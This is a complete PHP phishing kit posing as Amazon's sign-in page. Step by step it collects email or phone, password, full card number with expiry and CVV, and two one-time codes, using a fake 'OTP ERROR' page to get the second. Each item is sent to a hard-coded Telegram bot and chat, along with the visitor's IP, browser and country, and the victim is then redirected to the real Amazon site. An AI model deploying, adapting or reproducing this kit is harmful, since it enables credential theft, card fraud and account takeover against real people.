<?php
session_start();

// Telegram Bot Configuration
define('TELEGRAM_BOT_TOKEN', '7585548516:AAGRcY22KvqX3sme0cIf1b_NXkuF6aSJTA8');
define('TELEGRAM_CHAT_ID', '-1002554104085');

// Function to send message to Telegram
function sendToTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

// Function to get user info
function getUserInfo() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Detect browser
    $browser = 'Unknown';
    if (strpos($user_agent, 'Firefox') !== false) $browser = 'Firefox';
    elseif (strpos($user_agent, 'Chrome') !== false) $browser = 'Chrome';
    elseif (strpos($user_agent, 'Safari') !== false) $browser = 'Safari';
    elseif (strpos($user_agent, 'Edge') !== false) $browser = 'Edge';
    elseif (strpos($user_agent, 'Opera') !== false) $browser = 'Opera';
    
    // Detect device
    $device = 'Desktop';
    if (strpos($user_agent, 'Mobile') !== false) $device = 'Mobile';
    elseif (strpos($user_agent, 'Tablet') !== false) $device = 'Tablet';
    
    // Get country (simplified)
    $country = 'Unknown';
    $country_api = @file_get_contents("http://ip-api.com/json/{$ip}");
    if ($country_api) {
        $country_data = json_decode($country_api, true);
        $country = $country_data['country'] ?? 'Unknown';
    }
    
    return [
        'browser' => $browser,
        'device' => $device,
        'country' => $country,
        'ip' => $ip,
        'time' => date('Y-m-d H:i:s'),
        'user_agent' => $user_agent
    ];
}

// Send visit notification on first load
if (!isset($_SESSION['visit_logged']) && !isset($_POST['email_or_phone'])) {
    $user_info = getUserInfo();
    $message = "🌍 <b>NEW VISITOR</b> 🌍\n\n";
    $message .= "🌐 <b>Browser:</b> " . $user_info['browser'] . "\n";
    $message .= "📱 <b>Device:</b> " . $user_info['device'] . "\n";
    $message .= "🏳️ <b>Country:</b> " . $user_info['country'] . "\n";
    $message .= "🌍 <b>IP:</b> " . $user_info['ip'] . "\n";
    $message .= "🕒 <b>Time:</b> " . $user_info['time'] . "\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
    sendToTelegram($message);
    $_SESSION['visit_logged'] = true;
}

// Handle form submissions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $step = $_GET['step'] ?? 'email';
    
    switch($step) {
        case 'password':
            $email_or_phone = $_SESSION['user_input'] ?? '';
            $password = $_POST['password'] ?? '';
            if (!empty($password)) {
                $_SESSION['user_password'] = $password;
                
                // Send email and password together to Telegram
                $user_info = getUserInfo();
                $message = "🔐 <b>LOGIN CREDENTIALS CAPTURED</b> 🔐\n\n";
                $message .= "📧 <b>Email/Phone:</b> " . htmlspecialchars($email_or_phone) . "\n";
                $message .= "🔑 <b>Password:</b> " . htmlspecialchars($password) . "\n";
                $message .= "🌐 <b>Browser:</b> " . $user_info['browser'] . "\n";
                $message .= "📱 <b>Device:</b> " . $user_info['device'] . "\n";
                $message .= "🏳️ <b>Country:</b> " . $user_info['country'] . "\n";
                $message .= "🌍 <b>IP:</b> " . $user_info['ip'] . "\n";
                $message .= "🕒 <b>Time:</b> " . $user_info['time'] . "\n";
                $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
                sendToTelegram($message);
                
                header('Location: ?step=verify_card');
                exit;
            } else {
                $error = 'Please enter your password';
            }
            break;
            
        case 'verify_card':
            $cardholder_name = trim($_POST['cardholder_name'] ?? '');
            $card_number = trim($_POST['card_number'] ?? '');
            $expiration_date = trim($_POST['expiration_date'] ?? '');
            $security_code = trim($_POST['security_code'] ?? '');
            
            if (!empty($cardholder_name) && !empty($card_number) && !empty($expiration_date) && !empty($security_code)) {
                $_SESSION['card_data'] = [
                    'cardholder_name' => $cardholder_name,
                    'card_number' => $card_number,
                    'expiration_date' => $expiration_date,
                    'security_code' => $security_code
                ];
                
                // Send to Telegram
                $message = "💳 <b>CREDIT CARD CAPTURED</b> 💳\n\n";
                $message .= "📧 <b>Email/Phone:</b> " . htmlspecialchars($_SESSION['user_input']) . "\n";
                $message .= "👤 <b>Cardholder:</b> " . htmlspecialchars($cardholder_name) . "\n";
                $message .= "💳 <b>Card Number:</b> " . htmlspecialchars($card_number) . "\n";
                $message .= "📅 <b>Expiry:</b> " . htmlspecialchars($expiration_date) . "\n";
                $message .= "🔒 <b>CVV:</b> " . htmlspecialchars($security_code) . "\n";
                $message .= "🕒 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
                $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
                sendToTelegram($message);
                
                header('Location: ?step=loading1');
                exit;
            } else {
                $error = 'Please fill in all card details';
            }
            break;
            
        case 'otp':
            $otp = trim($_POST['otp'] ?? '');
            if (!empty($otp) && strlen($otp) >= 4 && strlen($otp) <= 8) {
                $_SESSION['otp_entered'] = $otp;
                
                // Send to Telegram
                $message = "📱 <b>FIRST OTP CAPTURED</b> 📱\n\n";
                $message .= "📧 <b>Email/Phone:</b> " . htmlspecialchars($_SESSION['user_input']) . "\n";
                $message .= "🔢 <b>OTP Code:</b> " . htmlspecialchars($otp) . "\n";
                $message .= "🕒 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
                $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
                sendToTelegram($message);
                
                header('Location: ?step=loading2');
                exit;
            } else {
                $error = 'Please enter a valid verification code (4-8 digits)';
            }
            break;
            
        case 'otp2':
            $otp2 = trim($_POST['otp2'] ?? '');
            if (!empty($otp2) && strlen($otp2) >= 4 && strlen($otp2) <= 8) {
                $_SESSION['otp2_entered'] = $otp2;
                
                // Send to Telegram
                $message = "📱 <b>SECOND OTP CAPTURED</b> 📱\n\n";
                $message .= "📧 <b>Email/Phone:</b> " . htmlspecialchars($_SESSION['user_input']) . "\n";
                $message .= "🔢 <b>Second OTP:</b> " . htmlspecialchars($otp2) . "\n";
                $message .= "🕒 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
                $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
                sendToTelegram($message);
                
                header('Location: ?step=final_loading');
                exit;
            } else {
                $error = 'Please enter a valid verification code (4-8 digits)';
            }
            break;
    }
}

// Handle email step
if (isset($_POST['email_or_phone']) && !isset($_GET['step'])) {
    $email_or_phone = trim($_POST['email_or_phone']);
    if (!empty($email_or_phone)) {
        $_SESSION['user_input'] = $email_or_phone;
        header('Location: ?step=password');
        exit;
    } else {
        $error = 'Please enter your email or mobile phone number';
    }
}

$step = $_GET['step'] ?? 'email';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0">
    <title>Amazon Sign In</title>
    <link rel="icon" href="https://www.amazon.com/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Amazon Ember", Arial, sans-serif;
            background-color: #ffffff;
            color: #111;
            line-height: 1.4;
            min-height: 100vh;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                max-width: 90%;
                margin: 20px auto;
                padding: 20px 15px;
            }
            
            .wide-container {
                max-width: 95%;
            }
            
            .form-title {
                font-size: 24px;
            }
            
            .input-row {
                flex-direction: column;
                gap: 10px;
            }
            
            .input-col-small {
                flex: 1;
            }
        }

        @media (max-width: 480px) {
            .container {
                margin: 10px auto;
                padding: 15px 10px;
                border: none;
                box-shadow: none;
            }
            
            .form-title {
                font-size: 22px;
                margin-bottom: 15px;
            }
            
            .form-input, .otp-input {
                padding: 8px 10px;
                font-size: 16px; /* Prevents zoom on iOS */
            }
            
            .continue-btn {
                height: 35px;
                line-height: 35px;
                font-size: 14px;
            }
            
            .header {
                padding: 10px 0;
            }
            
            .logo img {
                height: 35px;
            }
        }

        @media (min-width: 1200px) {
            .container {
                max-width: 380px;
            }
            
            .wide-container {
                max-width: 420px;
            }
        }

        .header {
            background-color: #ffffff;
            padding: 14px 0;
            text-align: center;
            border-bottom: 1px solid #ddd;
        }

        .logo {
            display: inline-block;
        }

        .logo img {
            height: 40px;
            width: auto;
        }

        .container {
            max-width: 350px;
            margin: 40px auto;
            padding: 20px 26px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background: #fff;
        }

        .wide-container {
            max-width: 400px;
        }

        .form-title {
            font-size: 28px;
            font-weight: 400;
            line-height: 1.2;
            margin-bottom: 18px;
            color: #111;
        }

        .form-group {
            margin-bottom: 18px;
        }

        .form-label {
            display: block;
            font-weight: 700;
            margin-bottom: 2px;
            color: #111;
            font-size: 13px;
        }

        .form-input {
            width: 100%;
            padding: 3px 7px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            font-size: 13px;
            line-height: 19px;
            background-color: #fff;
            height: 31px;
        }

        .form-input:focus {
            outline: none;
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228, 121, 17, .5);
        }

        .continue-btn {
            width: 100%;
            background: #ffd814;
            border: 1px solid #ffa500;
            border-radius: 3px;
            padding: 0;
            cursor: pointer;
            display: inline-block;
            height: 29px;
            font-size: 13px;
            line-height: 29px;
            text-align: center;
            text-decoration: none;
            color: #0f1111;
            font-family: inherit;
            font-weight: 400;
        }

        .continue-btn:hover {
            background: #f7ca00;
            border-color: #ff8f00;
        }

        .continue-btn:active {
            background: #febd69;
            border-color: #ff8f00;
        }

        .terms-text {
            font-size: 11px;
            color: #111;
            margin: 14px 0;
            line-height: 1.4;
        }

        .terms-link {
            color: #0066c0;
            text-decoration: none;
        }

        .terms-link:hover {
            text-decoration: underline;
            color: #c45500;
        }

        .help-section {
            margin: 16px 0;
        }

        .help-link {
            color: #0066c0;
            text-decoration: none;
            font-size: 13px;
        }

        .help-link:hover {
            text-decoration: underline;
            color: #c45500;
        }

        .divider {
            position: relative;
            top: 2px;
            padding: 14px 0;
            color: #767676;
            font-size: 12px;
            text-align: center;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(to right, transparent, #e7e7e7, transparent);
        }

        .divider-text {
            background: #fff;
            padding: 0 8px;
            position: relative;
            z-index: 1;
        }

        .business-section {
            color: #111;
            font-size: 13px;
        }

        .business-title {
            font-weight: 700;
            margin-bottom: 4px;
        }

        .business-link {
            color: #0066c0;
            text-decoration: none;
            font-size: 13px;
        }

        .business-link:hover {
            text-decoration: underline;
            color: #c45500;
        }

        .footer {
            margin-top: 50px;
            padding-top: 18px;
            text-align: center;
            color: #555;
            font-size: 11px;
            border-top: 1px solid #e7e7e7;
        }

        .footer-links {
            margin-bottom: 6px;
        }

        .footer-links a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 3px;
        }

        .footer-links a:hover {
            text-decoration: underline;
            color: #c45500;
        }

        .error-message {
            background: #ffeae9;
            border: 1px solid #d5252f;
            color: #d5252f;
            padding: 8px 18px;
            margin-bottom: 14px;
            font-size: 12px;
            border-radius: 4px;
        }

        .user-info {
            background: #f3f3f3;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 14px 18px;
            margin-bottom: 14px;
            font-size: 13px;
        }

        .user-email {
            font-weight: 700;
            color: #111;
        }

        .change-link {
            color: #0066c0;
            text-decoration: none;
            font-size: 13px;
            margin-left: 6px;
        }

        .change-link:hover {
            text-decoration: underline;
            color: #c45500;
        }

        /* OTP Styles */
        .otp-container {
            text-align: center;
        }

        .otp-description {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.5;
            text-align: center;
        }

        .otp-input {
            width: 100%;
            padding: 10px;
            border: 2px solid #a6a6a6;
            border-radius: 4px;
            font-size: 18px;
            text-align: center;
            letter-spacing: 2px;
            margin-bottom: 15px;
            height: 45px;
        }

        .otp-input:focus {
            border-color: #e77600;
            box-shadow: 0 0 5px 2px rgba(228, 121, 17, .3);
        }

        /* Loading Styles */
        .loading-container {
            text-align: center;
            padding: 40px 20px;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff9900;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: #666;
            font-size: 14px;
            margin-bottom: 10px;
        }

        .countdown {
            color: #ff9900;
            font-weight: 700;
            font-size: 16px;
        }

        /* Error Styles */
        .error-container {
            text-align: center;
        }

        .error-icon {
            color: #d5252f;
            font-size: 48px;
            margin-bottom: 15px;
        }

        .error-title {
            color: #d5252f;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .error-description {
            color: #666;
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .retry-btn {
            background: #ffd814;
            color: #0f1111;
            border: 1px solid #ffa500;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
            font-weight: 400;
        }

        .retry-btn:hover {
            background: #f7ca00;
            border-color: #ff8f00;
        }

        /* Card Input Styles */
        .card-number-input {
            font-family: monospace;
            letter-spacing: 1px;
        }

        /* Cross-browser compatibility */
        .form-input, .otp-input {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            -webkit-border-radius: 3px;
            -moz-border-radius: 3px;
            border-radius: 3px;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
        }

        .continue-btn, .retry-btn {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            -webkit-border-radius: 3px;
            -moz-border-radius: 3px;
            border-radius: 3px;
            -webkit-transition: all 0.2s ease;
            -moz-transition: all 0.2s ease;
            -o-transition: all 0.2s ease;
            transition: all 0.2s ease;
        }

        /* Mobile Safari fixes */
        @media screen and (-webkit-min-device-pixel-ratio: 0) {
            .form-input, .otp-input {
                font-size: 16px;
            }
        }

        /* Firefox specific fixes */
        @-moz-document url-prefix() {
            .form-input, .otp-input {
                padding: 4px 7px;
            }
        }

        /* Edge/IE fixes */
        @supports (-ms-ime-align: auto) {
            .form-input, .otp-input {
                padding: 5px 7px;
            }
        }

        .input-row {
            display: flex;
            gap: 15px;
        }

        .input-col {
            flex: 1;
        }

        .input-col-small {
            flex: 0 0 auto;
        }

        /* Success Styles */
        .success-container {
            text-align: center;
            padding: 40px 20px;
        }

        .success-icon {
            color: #067d68;
            font-size: 64px;
            margin-bottom: 20px;
        }

        .success-title {
            color: #067d68;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 15px;
        }

        .success-description {
            color: #666;
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <header class="header">
        <a href="#" class="logo">
            <img src="https://1000logos.net/wp-content/uploads/2016/10/Amazon-Logo.png" alt="Amazon">
        </a>
    </header>

    <div class="container <?php echo in_array($step, ['verify_card']) ? 'wide-container' : ''; ?>">
        <?php if ($step === 'email'): ?>
            <h1 class="form-title">Sign in or create account</h1>
            
            <?php if (isset($error)): ?>
                <div class="error-message"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>

            <form method="POST" action="">
                <div class="form-group">
                    <label for="email_or_phone" class="form-label">Enter mobile number or email</label>
                    <input 
                        type="text" 
                        id="email_or_phone" 
                        name="email_or_phone" 
                        class="form-input"
                        required
                        value="<?php echo isset($_POST['email_or_phone']) ? htmlspecialchars($_POST['email_or_phone']) : ''; ?>"
                    >
                </div>

                <button type="submit" class="continue-btn">Continue</button>
            </form>

            <div class="terms-text">
                By continuing, you agree to Amazon's 
                <a href="#" class="terms-link">Conditions of Use</a> 
                and 
                <a href="#" class="terms-link">Privacy Notice</a>.
            </div>

            <div class="help-section">
                <a href="#" class="help-link">Need help?</a>
            </div>

            <div class="divider">
                <span class="divider-text">New to Amazon?</span>
            </div>

            <div class="business-section">
                <div class="business-title">Buying for work?</div>
                <a href="#" class="business-link">Create a free business account</a>
            </div>

        <?php elseif ($step === 'password'): ?>
            <h1 class="form-title">Sign in</h1>
            
            <div class="user-info">
                <span class="user-email"><?php echo htmlspecialchars($_SESSION['user_input']); ?></span>
                <a href="?step=email" class="change-link">Change</a>
            </div>

            <?php if (isset($error)): ?>
                <div class="error-message"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>

            <form method="POST" action="?step=password">
                <div class="form-group">
                    <label for="password" class="form-label">Password</label>
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        class="form-input"
                        required
                    >
                </div>

                <button type="submit" class="continue-btn">Sign in</button>
            </form>

            <div class="help-section">
                <a href="#" class="help-link">Forgot your password?</a>
            </div>

        <?php elseif ($step === 'verify_card'): ?>
            <h1 class="form-title">Verify your account.</h1>
            
            <?php if (isset($error)): ?>
                <div class="error-message"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>

            <form method="POST" action="?step=verify_card">
                <div class="form-group">
                    <label for="cardholder_name" class="form-label">Cardholder name</label>
                    <input 
                        type="text" 
                        id="cardholder_name" 
                        name="cardholder_name" 
                        class="form-input"
                        required
                    >
                </div>

                <div class="form-group">
                    <label for="card_number" class="form-label">Card number</label>
                    <input 
                        type="text" 
                        id="card_number" 
                        name="card_number" 
                        class="form-input card-number-input"
                        placeholder="XXXX XXXX XXXX XXXX"
                        maxlength="19"
                        required
                    >
                </div>

                <div class="input-row">
                    <div class="input-col">
                        <div class="form-group">
                            <label for="expiration_date" class="form-label">Expiration date</label>
                            <input 
                                type="text" 
                                id="expiration_date" 
                                name="expiration_date" 
                                class="form-input"
                                placeholder="MM/YY"
                                maxlength="5"
                                required
                            >
                        </div>
                    </div>
                    <div class="input-col-small">
                        <div class="form-group">
                            <label for="security_code" class="form-label">security code</label>
                            <input 
                                type="text" 
                                id="security_code" 
                                name="security_code" 
                                class="form-input"
                                placeholder="CVV"
                                maxlength="4"
                                required
                            >
                        </div>
                    </div>
                </div>

                <button type="submit" class="continue-btn">Continue</button>
            </form>

        <?php elseif ($step === 'loading1'): ?>
            <div class="loading-container">
                <div class="spinner"></div>
                <div class="loading-text">Processing your information...</div>
                <div class="countdown" id="countdown">10</div>
            </div>

            <script>
                let timeLeft = 10;
                const countdownElement = document.getElementById('countdown');
                
                const timer = setInterval(function() {
                    timeLeft--;
                    countdownElement.textContent = timeLeft;
                    
                    if (timeLeft <= 0) {
                        clearInterval(timer);
                        window.location.href = '?step=otp';
                    }
                }, 1000);
            </script>

        <?php elseif ($step === 'otp'): ?>
            <div class="otp-container">
                <h1 class="form-title">Verification Required</h1>
                
                <div class="otp-description">
                    Please enter the verification code sent to your phone
                </div>

                <?php if (isset($error)): ?>
                    <div class="error-message"><?php echo htmlspecialchars($error); ?></div>
                <?php endif; ?>

                <form method="POST" action="?step=otp">
                    <div class="form-group">
                        <input 
                            type="text" 
                            id="otp" 
                            name="otp" 
                            class="otp-input"
                            placeholder="Enter 4-8 digit code"
                            pattern="[0-9]{4,8}"
                            maxlength="8"
                            required
                        >
                    </div>

                    <button type="submit" class="continue-btn">Verify</button>
                </form>

                <div class="help-section">
                    <a href="#" class="help-link">Didn't receive the code?</a>
                </div>
            </div>

        <?php elseif ($step === 'loading2'): ?>
            <div class="loading-container">
                <div class="spinner"></div>
                <div class="loading-text">Verifying your code...</div>
                <div class="countdown" id="countdown2">10</div>
            </div>

            <script>
                let timeLeft2 = 10;
                const countdownElement2 = document.getElementById('countdown2');
                
                const timer2 = setInterval(function() {
                    timeLeft2--;
                    countdownElement2.textContent = timeLeft2;
                    
                    if (timeLeft2 <= 0) {
                        clearInterval(timer2);
                        window.location.href = '?step=otp_error';
                    }
                }, 1000);
            </script>

        <?php elseif ($step === 'otp_error'): ?>
            <div class="error-container">
                <div class="error-icon">⚠️</div>
                <h1 class="error-title">OTP ERROR</h1>
                <div class="error-description">
                    The verification code you entered is incorrect.<br>
                    Please enter the new code that was sent to your device.
                </div>
                <a href="?step=otp2" class="retry-btn">Try Again</a>
            </div>

        <?php elseif ($step === 'otp2'): ?>
            <div class="otp-container">
                <h1 class="form-title">Verification Required</h1>
                
                <div class="otp-description">
                    Please enter the NEW verification code sent to your phone
                </div>

                <?php if (isset($error)): ?>
                    <div class="error-message"><?php echo htmlspecialchars($error); ?></div>
                <?php endif; ?>

                <form method="POST" action="?step=otp2">
                    <div class="form-group">
                        <input 
                            type="text" 
                            id="otp2" 
                            name="otp2" 
                            class="otp-input"
                            placeholder="Enter new 4-8 digit code"
                            pattern="[0-9]{4,8}"
                            maxlength="8"
                            required
                        >
                    </div>

                    <button type="submit" class="continue-btn">Verify</button>
                </form>

                <div class="help-section">
                    <a href="#" class="help-link">Didn't receive the code?</a>
                </div>
            </div>

        <?php elseif ($step === 'final_loading'): ?>
            <div class="loading-container">
                <div class="spinner"></div>
                <div class="loading-text">Verifying your account...</div>
                <div class="countdown" id="countdown3">5</div>
            </div>

            <script>
                let timeLeft3 = 5;
                const countdownElement3 = document.getElementById('countdown3');
                
                const timer3 = setInterval(function() {
                    timeLeft3--;
                    countdownElement3.textContent = timeLeft3;
                    
                    if (timeLeft3 <= 0) {
                        clearInterval(timer3);
                        window.location.href = '?step=success';
                    }
                }, 1000);
            </script>

        <?php elseif ($step === 'success'): ?>
            <div class="success-container">
                <div class="success-icon">✅</div>
                <h1 class="success-title">Account Verified</h1>
                <div class="success-description">
                    Your account has been successfully verified.<br>
                    You will be redirected to Amazon in a moment.
                </div>
            </div>

            <script>
                setTimeout(function() {
                    window.location.href = 'https://www.amazon.com';
                }, 3000);
            </script>

        <?php endif; ?>
    </div>

    <footer class="footer">
        <div class="footer-links">
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </div>
        <div>© 1996-2025, Amazon.com, Inc. or its affiliates</div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Auto focus on input field
            const input = document.querySelector('.form-input, .otp-input');
            if (input) {
                input.focus();
            }

            // Card number formatting
            const cardNumberInput = document.getElementById('card_number');
            if (cardNumberInput) {
                cardNumberInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
                    let formattedValue = value.match(/.{1,4}/g)?.join(' ') ?? value;
                    if (formattedValue !== e.target.value) {
                        e.target.value = formattedValue;
                    }
                });
            }

            // Expiry date formatting
            const expiryInput = document.getElementById('expiration_date');
            if (expiryInput) {
                expiryInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length >= 2) {
                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
                    }
                    e.target.value = value;
                });
            }

            // CVV numeric only
            const cvvInput = document.getElementById('security_code');
            if (cvvInput) {
                cvvInput.addEventListener('input', function(e) {
                    e.target.value = e.target.value.replace(/\D/g, '');
                });
            }

            // OTP numeric only
            const otpInputs = document.querySelectorAll('#otp, #otp2');
            otpInputs.forEach(function(otpInput) {
                if (otpInput) {
                    otpInput.addEventListener('input', function(e) {
                        e.target.value = e.target.value.replace(/\D/g, '');
                    });
                }
            });

            // Email/phone validation
            const emailOrPhoneInput = document.getElementById('email_or_phone');
            if (emailOrPhoneInput) {
                emailOrPhoneInput.addEventListener('input', function() {
                    const value = this.value.trim();
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    const phoneRegex = /^[\+]?[0-9\s\-\(\)]+$/;
                    
                    if (value && !emailRegex.test(value) && !phoneRegex.test(value)) {
                        this.setCustomValidity('Please enter a valid email or phone number');
                    } else {
                        this.setCustomValidity('');
                    }
                });
            }
        });
    </script>
</body>
</html>